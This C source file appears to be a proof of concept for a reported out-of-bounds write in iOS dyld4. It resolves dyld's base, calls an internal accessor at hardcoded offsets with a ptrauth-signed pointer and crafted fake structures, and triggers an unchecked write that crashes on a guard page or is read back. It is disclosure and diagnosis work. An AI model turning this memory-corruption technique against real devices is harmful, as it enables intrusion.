/*
 * crash_helper.c — deterministic .ips proof for the dyld4 OOB.
 *
 * We call dyld's own unchecked accessor with a crafted RuntimeState whose
 * validation array is placed so index (Ref & 0x7fff) = 32767 lands on a
 * read-only guard page. The resulting SIGSEGV PC is the EXACT unchecked strb
 * inside /usr/lib/dyld — visible in the .ips.
 *
 * Verified against dyld (iOS 27.0.1, 24A446), __TEXT base 0x18047c000:
 *   recursiveMarkBeingValidated : 0x1804b79fc  -> offset 0x3b9fc
 *   OOB read   ldrb [x8,x9]      : 0x1804b7a40  -> offset 0x3ba40
 *   OOB write  strb [x8,x9]      : 0x1804b7a84  -> offset 0x3ba84
 *
 * IMPORTANT: iOS arm64 pages are 16 KB. mprotect() requires page-aligned
 * addresses, so we use getpagesize() — never a hardcoded 4096.
 */

#include <dlfcn.h>
#include <sys/mman.h>
#include <ptrauth.h>
#include <mach-o/loader.h>
#include <unistd.h>
#include <errno.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define REC_MARK_OFFSET 0x3b9fc
#define OOB_STRB_OFFSET 0x3ba84
#define OOB_IDX 0x7fff
#define DYLD_TEXT_VMADDR 0x18047c000ULL

static char g_buf[512];

static uintptr_t text_vmaddr(const void *mhbase) {
    const struct mach_header_64 *mh = (const struct mach_header_64 *)mhbase;
    if (mh->magic != MH_MAGIC_64) return 0;
    const uint8_t *p = (const uint8_t *)(mh + 1);
    for (uint32_t i = 0; i < mh->ncmds; i++) {
        const struct load_command *lc = (const struct load_command *)p;
        if (lc->cmdsize < sizeof(struct load_command)) return 0;
        if (lc->cmd == LC_SEGMENT_64) {
            const struct segment_command_64 *seg = (const struct segment_command_64 *)lc;
            if (strcmp(seg->segname, "__TEXT") == 0) return (uintptr_t)seg->vmaddr;
        }
        p += lc->cmdsize;
    }
    return 0;
}

/* Resolve dyld's base via the shared-cache slide (works whether dlsym finds
 * dyld or libdyld.dylib, since both live in the same cache). */
static int locate_dyld(const char **imageName, uintptr_t *base, uintptr_t *fn) {
    static const char *candidates[] = {
        "dyld_get_image_header", "_dyld_get_image_header",
        "dyld_get_image_name", "_dyld_get_image_name",
        "dyld_get_image_vmaddr_slide", "_dyld_get_image_vmaddr_slide"
    };
    Dl_info di; memset(&di, 0, sizeof(di));
    *imageName = "(none)";
    for (unsigned i = 0; i < sizeof(candidates) / sizeof(candidates[0]); i++) {
        void *h = dlsym(RTLD_DEFAULT, candidates[i]);
        if (!h) continue;
        Dl_info t; memset(&t, 0, sizeof(t));
        if (dladdr(h, &t) != 0 && t.dli_fname) { di = t; *imageName = t.dli_fname; break; }
    }
    if (!di.dli_fbase) return 0;
    uintptr_t imgVM = text_vmaddr(di.dli_fbase);
    if (!imgVM) return 0;
    uintptr_t slide = (uintptr_t)di.dli_fbase - imgVM;
    uintptr_t b = slide + (uintptr_t)DYLD_TEXT_VMADDR;
    if (text_vmaddr((void *)b) != (uintptr_t)DYLD_TEXT_VMADDR) return 0;
    *base = b;
    *fn = b + REC_MARK_OFFSET;
    return 1;
}

/* fire=0: info only (no side effects).
 * fire=1: fire the OOB write on a read-only page -> SIGSEGV in dyld.
 * fire=2: DRY RUN on a fully RW array, read back byte[0x7fff] to prove the
 *         unchecked strb actually happened (no crash, for diagnosis). */
const char *probe_crash_dyld(int fire) {
    const char *image = "(none)";
    uintptr_t base = 0, fn = 0;
    if (!locate_dyld(&image, &base, &fn)) {
        snprintf(g_buf, sizeof(g_buf), "CRASH: cannot locate dyld base (last image=%s)", image);
        return g_buf;
    }
    uintptr_t strb = base + OOB_STRB_OFFSET;
    snprintf(g_buf, sizeof(g_buf),
             "CRASH-SETUP via=%s base=0x%lx fn=0x%lx OOB-strb=0x%lx expected-fault-PC=0x%lx pagesize=%d",
             image, (unsigned long)base, (unsigned long)fn, (unsigned long)strb,
             (unsigned long)strb, getpagesize());
    if (fire == 0) return g_buf;

    long ps = getpagesize();
    if (ps <= 0) ps = 4096;
    size_t page = (size_t)ps;

    /* The array base is page-aligned (mmap). idx 0x7fff lives in page
     * number (0x7fff / page). Make THAT page read-only. All other pages stay
     * PROT_NONE, so any wrong index faults too. */
    size_t region = page * 4;
    size_t target_page = OOB_IDX / page;
    void *mem = mmap(NULL, region, PROT_NONE, MAP_PRIVATE | MAP_ANON, -1, 0);
    if (mem == MAP_FAILED) { snprintf(g_buf, sizeof(g_buf), "CRASH: mmap failed errno=%d", errno); return g_buf; }

    void *target = (char *)mem + target_page * page;
    int prot = (fire == 1) ? PROT_READ : (PROT_READ | PROT_WRITE);
    if (mprotect(target, page, prot) != 0) {
        snprintf(g_buf, sizeof(g_buf), "CRASH: mprotect(%p,%zu) failed errno=%d (ps=%ld)",
                 target, page, errno, ps);
        return g_buf;
    }

    /* fake RuntimeState: validation-array pointer at +0x450 */
    uint8_t *state = (uint8_t *)calloc(1, 0x500);
    if (!state) { snprintf(g_buf, sizeof(g_buf), "CRASH: state alloc failed"); return g_buf; }
    memcpy(state + 0x450, &mem, sizeof(mem));

    /* fake loader: Ref u16 = 0xffff at +0x6 (idx 0x7fff, sign bit -> +0x450).
     * Allocate 0x100 bytes: the function also reads loader+0x30 on return. */
    uint8_t *loader = (uint8_t *)calloc(1, 0x100);
    if (!loader) { snprintf(g_buf, sizeof(g_buf), "CRASH: loader alloc failed"); return g_buf; }
    loader[6] = 0xff; loader[7] = 0xff;

    /* arm64e: sign as A-key function pointer (zero context) so the compiler's
     * braa reaches dyld instead of faulting in our own code. */
    void *sfn = ptrauth_sign_unauthenticated((void *)fn, ptrauth_key_function_pointer, 0);
    typedef void (*recfn)(void *, void *, unsigned long);

    if (fire == 2) {
        uint8_t *arr = (uint8_t *)mem;
        ((recfn)sfn)(loader, state, 0);
        snprintf(g_buf, sizeof(g_buf),
                 "DRYRUN byte[0x7fff]=0x%02x %s (ps=%ld target_page=%zu)",
                 arr[OOB_IDX], arr[OOB_IDX] == 1 ? "OOB-WRITE-CONFIRMED" : "UNEXPECTED",
                 ps, target_page);
        return g_buf;
    }

    ((recfn)sfn)(loader, state, 0);   /* expected: SIGSEGV inside dyld at strb */
    snprintf(g_buf, sizeof(g_buf), "CRASH: returned unexpectedly (no fault)");
    return g_buf;
}
